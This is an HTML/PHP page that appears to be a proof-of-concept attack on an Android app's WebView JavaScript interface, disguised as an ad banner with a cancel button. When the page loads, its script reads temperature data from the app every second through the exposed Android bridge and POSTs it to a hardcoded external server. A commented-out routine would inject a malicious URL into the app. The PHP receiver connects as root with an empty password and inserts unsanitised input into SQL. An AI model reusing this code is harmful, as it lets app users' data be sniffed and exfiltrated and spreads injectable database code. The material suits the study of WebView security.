<html>
	<head>
		<script>
		let maliciousUrl = "";
		let tempToWrite = "";
		let xhttp = new XMLHttpRequest();
		

		function getJavaFunction() {
			maliciousUrl = "http://10.12.0.44/metawear-ads/index.php";

			//comment these 2 function calls for non-attack scenario
			//uncomment new injectUrl(maliciousUrl) for injection attack
			//new injectUrl(maliciousUrl);

			//uncomment getTemp() for sniffing attack
			getTemp();

		}

		//Injects malicious URL to Android and calls clearAd()
		function injectUrl(maliciousUrl) {
			fakeUrl = maliciousUrl;

			//Set fakeUrl in Android app
			Android.setUrl(fakeUrl);
			clearAds();
		}

		//reading temperature from Android in every 1 second using AJAX
		setInterval(function getTemp() {
			let listOfTemp = Android.getTemperature();
			tempToWrite = listOfTemp.substring(1, listOfTemp.length-1);
			//document.getElementById("adsHere").innerHTML = tempToWrite;
			xhttp.open("POST", "http://10.12.0.44/metawear-ads/index.php" , true);
			xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			xhttp.send("celsius="+tempToWrite);
			//xhttp.abort();
		},1000); 


		//clearing the body when ads is cancelled (cancel button pressed)
		function clearAds() {
			divValue = document.getElementById("adsBody");
			divValue.parentNode.removeChild(divValue);
		}
		
		</script>

	</head>

		<body id="adsBody"> 

		<?php
			
			error_reporting(0);
			$servername = "localhost";
			$username = "root";
			$password = "";
			$dbname = "metaweardb";
			
			$time = round(microtime(true) * 1000);
			$temperature= $_POST['celsius'];
			
			// Create connection
			$conn = new mysqli($servername, $username, $password, $dbname);
			// Check connection
			if ($conn->connect_error) {
			    die("Connection failed: " . $conn->connect_error);
			} 
			
			if($temperature!= NULL) {
				$sql = "INSERT INTO tbl_data(time, temperature)
				VALUES ('$time', '$temperature')";
			
				$conn->query($sql);
			
			}
				
			
			
			
			$conn->close();
	
		?>
		
	
		<div id="adsHere" style="margin:0; padding:0; height: 0; width: 0;">
			<p id="adsHere"></p>
			<p id="toTest"></p>
			<p style="width:680px; height: 60px; border:2px solid #000;">
				<span>Ads come here<br/> Ads can be cancelled pressing cancel button</span><br />
				<a href="http://localhost/metawear-ads/display.php">View collected data</a> 
				<input type="button" value="Cancel Ads" name="submit" onclick="getJavaFunction()" style="float:right;" /> 
			</p>

		</div>
			
			
		
	</body>
	
	
	
</html>